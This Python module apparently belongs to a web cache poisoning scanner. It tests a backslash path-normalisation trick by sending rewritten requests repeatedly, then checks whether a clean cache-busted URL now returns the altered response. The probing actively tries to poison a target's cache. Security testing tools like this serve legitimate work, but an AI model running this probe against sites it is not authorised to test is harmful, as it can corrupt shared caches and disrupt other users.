#! /usr/bin/env python3
# -*- coding: utf-8 -*-

from utils.utils import requests, random, sys, configure_logger, human_time, cache_tag_verify, urlparse
from utils.style import Identify, Colors
import utils.proxy as proxy

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

VULN_NAME = "BACKSLASH "

def parse_path(url_b):
    parsed = urlparse(url_b)
    base = f"{parsed.scheme}://{parsed.netloc}"
    segments = parsed.path.split('/')
    
    if len(segments) > 2:
        new_path = '/' + '\\'.join(segments[1:])
    else:
        return None

    result = base + new_path
    result += '?' + parsed.query
    return result


def backslash_test(pp, url_b, req_main, s):
    for _ in range(0, 5):
        req_b = s.get(pp, verify=False, timeout=10, allow_redirects=False)
    cache_status = cache_tag_verify(req_b)    
    if req_b.status_code != req_main.status_code:
        print(f" {Identify.behavior} | {VULN_NAME} {req_main.status_code} > {req_b.status_code} | CACHETAG : {cache_status} | \033[34m{url_b}\033[0m | PAYLOAD: {Colors.THISTLE}{pp}{Colors.RESET}")
        vcp_c = vcp_code(url_b, s, req_b)
        if vcp_c:
            print(f" {Identify.confirmed} | {VULN_NAME} {req_main.status_code} > {req_b.status_code} | CACHETAG : {cache_status} | \033[34m{url_b}\033[0m | PAYLOAD: {Colors.THISTLE}{pp}{Colors.RESET}")
    elif len(req_b.content) != len(req_main.content):
        print(f" {Identify.behavior} | {VULN_NAME} {len(req_main.content)}b > {len(req_b.content)}b | CACHETAG : {cache_status} | \033[34m{url_b}\033[0m | PAYLOAD: {Colors.THISTLE}{pp}{Colors.RESET}")
        vcp_l = vcp_len(url_b, s, req_b)
        if vcp_l:
            print(f" {Identify.confirmed} | {VULN_NAME} {len(req_main.content)}b > {len(req_b.content)}b | CACHETAG : {cache_status} | \033[34m{url_b}\033[0m | PAYLOAD: {Colors.THISTLE}{pp}{Colors.RESET}")
    


def vcp_code(url_b, s, req_b):
    req_verify = requests.get(url_b, verify=False, headers={"User-agent": "xxxxxxx"}, timeout=10, allow_redirects=False)
    if req_verify.status_code == req_b.status_code:
        print(req_verify.status_code)
        return True
    else:
        return False
        

def vcp_len(url_b, s, req_b):
    req_verify = requests.get(url_b, verify=False, headers={"User-agent": "xxxxxxx"}, timeout=10, allow_redirects=False)
    if len(req_verify.content) == len(req_b.content):
        print(len(req_verify.content))
        return True
    else:
        return False

     
def backslash_poisoning(uri, s):
    url_b = f"{uri}?cb={random.randrange(999)}"
    req_main = s.get(url_b, verify=False, timeout=10, allow_redirects=False)
    pp = parse_path(url_b)
    if pp:
        backslash_test(pp, url_b, req_main, s)